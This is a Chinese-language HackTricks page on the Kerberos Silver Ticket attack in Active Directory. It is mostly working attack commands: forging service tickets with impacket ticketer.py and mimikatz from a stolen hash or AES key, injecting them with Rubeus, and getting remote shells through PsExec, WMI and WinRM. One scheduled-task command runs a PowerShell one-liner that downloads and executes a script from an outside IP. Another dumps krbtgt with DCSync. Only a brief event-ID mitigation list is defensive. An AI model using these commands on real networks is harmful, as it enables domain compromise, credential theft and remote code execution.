# 银票

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 上看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 NFT 收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果你对**黑客职业**感兴趣并且想要黑掉不可黑掉的东西 - **我们正在招聘！**（需要流利的波兰语书面和口语表达能力）。

{% embed url="https://www.stmcyber.com/careers" %}

## 银票

银票攻击是基于**在拥有服务的 NTLM 哈希（如 PC 账户哈希）的情况下，构造一个有效的 TGS**。因此，可以通过伪造自定义 TGS **以任何用户的身份**获得对该服务的访问权限。

在这种情况下，拥有了一个计算机账户的 NTLM **哈希**（在 AD 中类似于用户账户）。因此，可以通过 SMB 服务**伪造**一个**票据**，以管理员权限**进入该计算机**。计算机账户默认每30天重置密码。

还必须考虑到可以使用 AES Kerberos 密钥（AES128 和 AES256）**伪造票据**，这是**可能且更好的**（操作安全）。要了解如何生成 AES 密钥，请阅读：[MS-KILE 的第4.4节](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) 或 [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)。

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

在Windows中，可以使用**Mimikatz**来**构造**票据。然后，使用**Rubeus**注入票据，最后通过**PsExec**可以获得远程shell。

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

**CIFS**服务允许您访问受害者的文件系统。您可以在此处找到其他服务：[**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**。**例如，您可以使用**HOST服务**在计算机上创建一个_schtask_。然后，您可以尝试列出受害者的任务来检查是否成功：`schtasks /S <hostname>`或者您可以使用**HOST和RPCSS服务**在计算机上执行**WMI**查询，测试方法如下：`Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### 缓解措施

银票事件ID（比黄金票更隐蔽）：

* 4624：账户登录
* 4634：账户注销
* 4672：管理员登录

[**有关银票的更多信息，请参阅ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## 可用服务

| 服务类型                                 | 服务银票                                                         |
| ---------------------------------------- | ---------------------------------------------------------------- |
| WMI                                      | <p>HOST</p><p>RPCSS</p>                                          |
| PowerShell 远程管理                      | <p>HOST</p><p>HTTP</p><p>根据操作系统还有：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                    | <p>HOST</p><p>HTTP</p><p>在某些情况下，您只需请求：WINRM</p>         |
| 计划任务                                 | HOST                                                             |
| Windows 文件共享，也可以使用psexec        | CIFS                                                             |
| LDAP 操作，包括 DCSync                    | LDAP                                                             |
| Windows 远程服务器管理工具                | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                 |
| 黄金票                                   | krbtgt                                                           |

使用**Rubeus**，您可以使用以下参数请求所有这些票证：

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## 滥用服务票证

在以下示例中，假设使用管理员帐户模拟检索到票证。

### CIFS

使用此票证，您将能够通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被公开），并将文件复制到远程文件系统的某个位置，只需执行以下操作：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
您还可以使用**psexec**在主机内获取一个shell或执行任意命令：

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### 主机

通过此权限，您可以在远程计算机上生成计划任务并执行任意命令：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### 主机 + RPCSS

使用这些票据，您可以在受害系统上执行 WMI：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
在以下页面中查找有关wmiexec的更多信息：

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### 主机 + WSMAN (WINRM)

通过计算机上的winrm访问，您可以**访问它**，甚至获取PowerShell：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
请查看以下页面以了解使用winrm与远程主机建立连接的更多方法：

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
请注意，要访问远程计算机，**winrm必须处于活动状态并监听**。
{% endhint %}

### LDAP

通过此特权，您可以使用**DCSync**来转储DC数据库：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**在以下页面了解更多关于DCSync的内容**：

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果你对**黑客职业**感兴趣并且想要攻破不可攻破的目标 - **我们正在招聘！**（需要流利的波兰语书面和口语表达能力）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
